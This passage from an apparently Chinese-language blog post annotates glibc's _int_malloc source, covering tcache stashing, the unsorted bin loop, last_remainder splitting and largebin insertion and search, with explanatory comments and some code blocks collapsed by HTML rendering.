set_inuse_bit_at_offset(victim, nb);<br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br>            check_malloced_chunk(av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">	     stash them in the tcache.  */</span><br>            <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br>            <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>            &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                    &#123;<br>                        bck = tc_victim-&gt;bk;<br>                        set_inuse_bit_at_offset(tc_victim, nb);<br>                        <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                            set_non_main_arena(tc_victim);<br>                        bin-&gt;bk = bck;<br>                        bck-&gt;fd = bin;<br><br>                        tcache_put(tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>            <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>###largebin_range</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*     If this is a large request, consolidate fastbins before continuing.     While it might look excessive to kill all fastbins before     even seeing if there is space available, this avoids     fragmentation problems normally associated with fastbins.     Also, in practice, programs tend to have runs of either small or     large requests, but less often mixtures, so consolidation is not     invoked all that often in most programs. And the programs that     it is called frequently in otherwise tend to fragment.   */</span>  <span class="hljs-keyword">else</span>    &#123;      idx = largebin_index (nb);      <span class="hljs-keyword">if</span> (have_fastchunks (av))        malloc_consolidate (av);    &#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>简而言之就是先执行<a href="#malloc_consolidate">malloc_consolidate</a>(), 合并fastbin中的free chunks</li>
</ul>
<h3 id="unsorted-bin-大循环"><a href="#unsorted-bin-大循环" class="headerlink" title="unsorted bin 大循环"></a><em><u>unsorted bin 大循环</u></em></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*     Process recently freed or remaindered chunks, taking one only if     it is exact fit, or, if this a small request, the chunk is remainder from     the most recent non-exact fit.  Place other traversed chunks in     bins.  Note that this step is the only place in any routine where     chunks are placed in bins.     The outer loop here is needed because we might not realize until     near the end of malloc that we should have consolidated, so must     do so and retry. This happens at most once, and only when we would     otherwise need to expand memory to service a &quot;small&quot; request.   */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHEINTERNAL_SIZE_T tcache_nb = 0;size_t tc_idx = csize2tidx(nb);<span class="hljs-meta-keyword">if</span> (tcache &amp;&amp; tc_idx <span class="hljs-meta-string">&lt; mp_.tcache_bins)    tcache_nb = nb;int return_cached = 0;tcache_unsorted_count = 0;#endiffor (;;)&#123;    int iters = 0;    while ((victim = unsorted_chunks(av)-&gt;</span>bk) != unsorted_chunks(av))<span class="hljs-comment">// 取出链表最后一个, FIFO    &#123;        bck = victim-&gt;bk; //倒数第二个        //victim过大或过小都会出错        if (__builtin_expect(chunksize_nomask(victim) &lt;= 2 * SIZE_SZ, 0) || 										__builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, 0))            malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;, chunk2mem(victim), av);                size = chunksize(victim);</span></span><br></code></pre></td></tr></table></figure>

<h4 id="victim-last-remainer"><a href="#victim-last-remainer" class="headerlink" title="victim == last_remainer"></a>victim == last_remainer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">           only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">           runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">           exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">           no exact fit for a small chunk.</span><br><span class="hljs-comment">         */</span><br><span class="hljs-comment">// 如果当前请求位于small chunks的大小范围内</span><br>    	<span class="hljs-comment">// 同时，unsorted bin里只有一个chunk，该chunk还是last_remainder</span><br>    	<span class="hljs-comment">// 并且 last remainder 的大小分割后还可以作为一个 chunk</span><br>      <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; <br>          bck == unsorted_chunks(av) &amp;&amp; <br>          victim == av-&gt;last_remainder &amp;&amp; <br>          (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE)) <span class="hljs-comment">//victim分割出nb后还有MINSIZE</span><br>      &#123;<br>          <span class="hljs-comment">/* split and reattach remainder */</span><br>          remainder_size = size - nb;<br>          <span class="hljs-comment">//分割后剩下的chunk指针</span><br>          remainder = chunk_at_offset(victim, nb);<br>          <span class="hljs-comment">//设置从unsorted bin中割出来的chunk的fd和bk</span><br>          unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<br>          <span class="hljs-comment">//更新last_remainer</span><br>          av-&gt;last_remainder = remainder;<br>          <span class="hljs-comment">//设置剩下的chunk的fd和bk</span><br>          remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<br>          <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>          &#123;<span class="hljs-comment">//如果是largechunk, 也设置一下nextsize</span><br>              remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>              remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>          &#125;<br>          <span class="hljs-comment">//设置两个块的标记bit</span><br>          set_head(victim, nb | PREV_INUSE |<br>                               (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head(remainder, remainder_size | PREV_INUSE);<br>          set_foot(remainder, remainder_size);<br>          <span class="hljs-comment">//详细的检查</span><br>          check_malloced_chunk(av, victim, nb);<br>          <span class="hljs-comment">//返回用户指针</span><br>          <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>          alloc_perturb(p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>      &#125;<br></code></pre></td></tr></table></figure>

<h4 id="else-取出victim-准备放入合适的bin中"><a href="#else-取出victim-准备放入合适的bin中" class="headerlink" title="else 取出victim, 准备放入合适的bin中"></a>else 取出victim, 准备放入合适的bin中</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//如果不满足上面的条件, 就往下执行        /* remove from unsorted list */ //取出了victim        unsorted_chunks(av)-&gt;bk = bck;        bck-&gt;fd = unsorted_chunks(av);</span><br></code></pre></td></tr></table></figure>

<h4 id="if-exact-fit"><a href="#if-exact-fit" class="headerlink" title="if exact fit"></a>if exact fit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take now instead of binning if exact fit */</span>		<span class="hljs-comment">//如果有刚好的chunk        if (size == nb)        &#123;            set_inuse_bit_at_offset(victim, size);            if (av != &amp;main_arena)                set_non_main_arena(victim);#if USE_TCACHE            /* Fill cache first, return to user only if cache fills.		 We may return one of these chunks later.  */            if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)            &#123;                tcache_put(victim, tc_idx);                return_cached = 1;                continue;            &#125;            else            &#123;#endif                check_malloced_chunk(av, victim, nb);                void *p = chunk2mem(victim);                alloc_perturb(p, bytes);                return p;#if USE_TCACHE            &#125;#endif        &#125;</span><br></code></pre></td></tr></table></figure>

<h4 id="放入small-or-large-bin"><a href="#放入small-or-large-bin" class="headerlink" title="放入small or large bin"></a>放入small or large bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* place chunk in bin */</span><br>		<span class="hljs-comment">//这一步意味着没有刚好合适的chunk, 所以放入到相应的bin中</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(size))<br>        &#123;<span class="hljs-comment">//如果是smallbin</span><br>            victim_index = smallbin_index(size);<br>            bck = bin_at(av, victim_index);<span class="hljs-comment">//bin数组里的chunk指针</span><br>            fwd = bck-&gt;fd;<span class="hljs-comment">//smallbin链表里的第一个chunk</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<span class="hljs-comment">//如果不是的话就是largebin了</span><br>            victim_index = largebin_index(size);<br>            bck = bin_at(av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-comment">//largebin是有顺序的, 要放在合适的位置, 还要设置fd_nextsize等等</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>            &#123;<span class="hljs-comment">//如果largebin为非空</span><br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                <span class="hljs-comment">//如果不是在main_arena呢?看来还是得学一学线程</span><br>                assert(chunk_main_arena(bck-&gt;bk));<br>                <span class="hljs-comment">//chunksize_nomask()直接取出size段, 不用位运算, 所以说speed comparison</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(bck-&gt;bk))<br>                &#123;<span class="hljs-comment">//victim的size小于largebin尾部(bck-&gt;bk)的最小chunk</span><br>                   	<span class="hljs-comment">// 令 fwd 指向 large bin 头</span><br>                    fwd = bck;<br>                    <span class="hljs-comment">// 令 bck 指向 largin bin 尾部 chunk</span><br>                    bck = bck-&gt;bk;<br>                    <span class="hljs-comment">// victim 的 fd_nextsize 指向 largin bin 的第一个 chunk</span><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    <span class="hljs-comment">// victim 的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize</span><br>                    <span class="hljs-comment">//原来链表的第一个 chunk 指向的 bk_nextsize是原来最小的(chunk A),</span><br>                    <span class="hljs-comment">//因为这时victim比A小, 所以victim的bk_nextsize肯定是A</span><br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    <span class="hljs-comment">// 原来链表的第一个 chunk 的 bk_nextsize 指向 victim</span><br>                    <span class="hljs-comment">// 原来指向链表第一个 chunk 的 fd_nextsize 指向 victim</span><br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                        <span class="hljs-comment">// 当前要插入的 victim 的大小大于最小的 chunk</span><br>                        <span class="hljs-comment">// 判断 fwd 是否在 main arena</span><br>                        assert(chunk_main_arena(fwd));<br>                        <span class="hljs-comment">// 从链表头部开始找到不比 victim 大的 chunk</span><br>                        <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; chunksize_nomask(fwd)) &#123;<br>                            fwd = fwd-&gt;fd_nextsize;<br>                            assert(chunk_main_arena(fwd));<br>                        &#125;<br>                        <span class="hljs-comment">// 如果找到了一个和 victim 一样大的 chunk，</span><br>                        <span class="hljs-comment">// 那就直接将 chunk 插入到该chunk的后面，并不修改 nextsize 指针。</span><br>                        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size ==<br>                            (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask(fwd))<br>                            <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                            fwd = fwd-&gt;fd;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-comment">// 如果找到的chunk和当前victim大小不一样</span><br><span class="hljs-comment">//就需要构造 nextsize 双向链表,victim指向fwd和后一个(A),A的fd_next指向victim,fwd的bk_next指向victim(最后一行)</span><br>                            <span class="hljs-comment">// 这段真的妙, 我自己写估计得调试出好几个版本</span><br>                            victim-&gt;fd_nextsize              = fwd;<br>                            victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;<br>                            fwd-&gt;bk_nextsize                 = victim;<br>                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                        bck = fwd-&gt;bk;<span class="hljs-comment">//</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-comment">//如果largebin是空的,fd_next和bk_next都指向自己就可以了</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>        &#125;<br>	   <span class="hljs-comment">//完成victim的fd和bk指针的修改, 形成fwd--&gt;victim--&gt;bck</span><br>        mark_bin(av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;	<span class="hljs-comment">//以上两行将victim插入到相应的链表头部中</span><br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;	<span class="hljs-comment">//修改bck的fd指向victim, fwd(即现在的第二个chunk)的bk指向victim</span><br></code></pre></td></tr></table></figure>

<h4 id="判断iters-大循环结尾"><a href="#判断iters-大循环结尾" class="headerlink" title="判断iters(大循环结尾)"></a>判断iters(大循环结尾)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>        <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment">	 filling the cache, return one of the cached ones.  */</span><br>        ++tcache_unsorted_count;<br>        <span class="hljs-keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>        &#123;<br>            <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_ITERS 10000</span><br>        <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<span class="hljs-comment">//unsorted大循环结束, 避免花费过多时间在unsortedbin的处理上</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>    <span class="hljs-keyword">if</span> (return_cached)<br>    &#123;<br>        <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure>

<h3 id="large-request"><a href="#large-request" class="headerlink" title="large request"></a><u>large request</u></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">        sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//回想一下, 循环之前判断了fastbin和smallbin, 到largebin的时候先malloc_consolidate清理fastbin到unsortedbin,</span><br><span class="hljs-comment">//从unsortedbin中一个个取出,历经last_remainer,exact fit和放入相应bin中后, 循环中只判断了从unsortedbin中取出的块</span><br><span class="hljs-comment">//即合并之后的chunk,并且没有一块和nb相等.由于smallbin每个bin大小一致,也就是说两次比较smallbin中都没有合适的chunk,</span><br><span class="hljs-comment">//跳出循环之后直接找 *largechunk* 里的即可, 并且是find smallest that fits, 不一定要刚刚好</span><br>   <span class="hljs-keyword">if</span> (!in_smallbin_range(nb))<br>   &#123;<br>       bin = bin_at(av, idx); <span class="hljs-comment">//idx是nb定位出来的idx,在大循环之前,到这里说明是largebin_idx</span><br><br>       <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>       <span class="hljs-keyword">if</span> ((victim = first(bin)) != bin &amp;&amp; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(victim) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb))<br>       &#123;<span class="hljs-comment">//如果该largebin非空 且 最大的不小于nb</span><br>           <span class="hljs-comment">//为了反向遍历,victim指向最后一个最小的largechunk</span><br>           victim = victim-&gt;bk_nextsize;<br>           <span class="hljs-comment">//找出第一个不小于nb的块, 并且赋值size为这个chunk的大小</span><br>           <span class="hljs-comment">//如果有多个相同大小的chunk, victim会定位到第一个有fd_nextsize指针的chunk</span><br>           <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size = chunksize(victim)) &lt;(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb)))<br>               victim = victim-&gt;bk_nextsize;<br><br>           <span class="hljs-comment">//如果从largebin链表中选取的victim不是链表中的最后一个chunk,并且与victim大小相同的chunk不止一个</span><br>           <span class="hljs-comment">//意味着victim为chunk size链表中的节点</span><br>           <span class="hljs-comment">//为了避免调整chunksize链表, 将victim的fd作为候选chunk</span><br>           <span class="hljs-keyword">if</span> (victim != last(bin) &amp;&amp; chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))<br>               victim = victim-&gt;fd;<br>           <br>	   <span class="hljs-comment">//准备分割,unlink取出victim</span><br>           remainder_size = size - nb;<br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//如果剩下的小于MINSIZE就把整个victim给出去</span><br>               <span class="hljs-comment">//例行设置inuse_bit和non_main_arena_bit</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><span class="hljs-comment">//如果过大就要分割</span><br>           &#123;<br>               remainder = chunk_at_offset(victim, nb);<span class="hljs-comment">//取出剩下的chunk指针, 前面写过相关过程</span><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               <span class="hljs-comment">//插入unsortedbin头部</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<span class="hljs-comment">//简单的检查,防止fwd被篡改</span><br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<span class="hljs-comment">//插入完成</span><br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<span class="hljs-comment">//largebin就设置一下</span><br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>

<h3 id="Search-for-next-largest-bin"><a href="#Search-for-next-largest-bin" class="headerlink" title="Search for next largest bin"></a>Search for next largest bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">        bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">        (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">        that fits is selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">        The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">        when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//fastbin,smallbin中刚好的--&gt;fastbin合并后+unsortedbin中刚好的--&gt;用nb定位的largebin_idx中不小于的</span><br><span class="hljs-comment">//以上这些全部失败之后进行下面的操作,寻找比当前idx更大的idx</span><br>   ++idx;<span class="hljs-comment">//直接+1</span><br>   bin = bin_at(av, idx);<br><span class="hljs-comment">//使用bitmap能够避免循环判断+1后的idx指向的链表是不是空的</span><br><span class="hljs-comment">//除了mark_bin unmark_bin get_binmap其他binmap函数都不涉及 binmap数组, 只是单纯的移位运算</span><br>   block = idx2block(idx);	<span class="hljs-comment">//算出block</span><br>   <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<span class="hljs-comment">//取出map</span><br>   bit = idx2bit(idx);		<span class="hljs-comment">//算出该位的bit</span><br><br>   <span class="hljs-keyword">for</span> (;;)<br>   &#123;<span class="hljs-comment">//大循环,找到后 or 没有--&gt;(goto use_top)</span><br>       <span class="hljs-comment">/* Skip 